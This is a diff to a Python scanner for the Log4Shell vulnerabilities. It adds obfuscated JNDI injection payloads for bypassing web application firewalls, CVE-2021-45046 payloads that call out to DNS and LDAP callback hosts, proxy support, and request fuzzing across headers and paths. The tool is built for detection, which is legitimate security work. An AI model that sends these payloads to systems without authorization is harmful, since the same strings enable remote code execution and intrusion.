@@ -72,10 +72,31 @@ typical_ports = ['443', '80', '81', '7000', '3333', '9800', '8080', '8000', '100
 
 counter = 0
 
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
+                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
+                       "${jndi:rmi://{{callback_host}}}",
+                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
+                       "${jndi:dns://{{callback_host}}}",
+                       ]
+
+cve_2021_45046 = [
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
+                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
+                 ]  
+
+
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
                     dest="url",
                     help="Check a single URL.",
+                    action='store')
+parser.add_argument("-p", "--proxy",
+                    dest="proxy",
+                    help="send requests through proxy",
                     action='store')
 parser.add_argument("-l", "--list",
                     dest="usedlist",
@@ -103,10 +124,15 @@ parser.add_argument("--wait-time",
                     dest="wait_time",
                     help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
                     default=5,
+                    type=int,
                     action='store')
 parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
+                    action='store_true')
+parser.add_argument("--test-CVE-2021-45046",
+                    dest="cve_2021_45046",
+                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
                     action='store_true')
 parser.add_argument("--dns-callback-provider",
                     dest="dns_callback_provider",
@@ -147,12 +173,20 @@ parser.add_argument("--timeout",
                     help="Sets the timeout for the async requests.",
                     action='store',
                     default=0.2)
+parser.add_argument("--disable-http-redirects",
+                    dest="disable_redirects",
+                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
+                    action='store_true')
 
 args = parser.parse_args()
 
 timeout = float(args.timeout)
 
 futures = []
+
+proxies = {}
+if args.proxy:
+    proxies = {"http": args.proxy, "https": args.proxy}
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
@@ -187,14 +221,27 @@ def generate_path_payloads(callback_host, random_string):
     paths = [p.replace(f'{{callback_host}}', callback_host).replace(f'{{random}}', random_string) for p in all_paths]
     return paths
 
+def get_cve_2021_45046_payloads(callback_host, random_string):
+    payloads = []
+    for i in cve_2021_45046:
+        new_payload = i.replace("{{callback_host}}", callback_host)
+        new_payload = new_payload.replace("{{random}}", random_string)
+        payloads.append(new_payload)
+    return payloads
+
+
 class Dnslog(object):
     def __init__(self):
         self.s = requests.session()
-        req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
+        req = self.s.get("http://www.dnslog.cn/getdomain.php",
+                         proxies=proxies,
+                         timeout=30)
         self.domain = req.text
 
     def pull_logs(self):
-        req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
+        req = self.s.get("http://www.dnslog.cn/getrecords.php",
+                         proxies=proxies,
+                         timeout=30)
         return req.json()
 
 
@@ -220,6 +267,8 @@ class Interactsh:
 
         self.session = requests.session()
         self.session.headers = self.headers
+        self.session.verify = False
+        self.session.proxies = proxies
         self.register()
 
     def register(self):
@@ -297,13 +346,15 @@ def scan_url(url, callback_host):
     global counter
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    callback_hosts = [callback_host, f'127.0.0.1#{callback_host}']
+    callback_hosts = [f'{parsed_url["host"]}.{callback_host}']
+    if args.waf_bypass_payloads:
+        callback_hosts.append(f'127.0.0.1#{parsed_url["host"]}.{callback_host}')
     for callback_host in callback_hosts:
-        payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+        payload = '${jndi:ldap://%s/%s}' % (callback_host, random_string)
         payloads = [payload]
         if args.waf_bypass_payloads:
-            payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
-        paths = generate_path_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
+            payloads.extend(generate_waf_bypass_payloads(callback_host, random_string))
+        paths = generate_path_payloads(callback_host, random_string)
         for payload in payloads:
             cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
             headers = get_fuzzing_headers(payload)
@@ -313,7 +364,8 @@ def scan_url(url, callback_host):
                     future = async_session.get(url=get_url,
                                     headers=headers,
                                     verify=False,
-                                    timeout=timeout)
+                                    timeout=timeout,
+                                    allow_redirects=(not args.disable_redirects))
                     future.i = counter
                     counter += 1
                     futures.append(future)
@@ -324,7 +376,8 @@ def scan_url(url, callback_host):
                     future = async_session.post(url=post_url,
                                     headers=headers,
                                     verify=False,
-                                    timeout=timeout)
+                                    timeout=timeout,
+                                    allow_redirects=(not args.disable_redirects))
                     future.i = counter
                     counter += 1
                     futures.append(future)
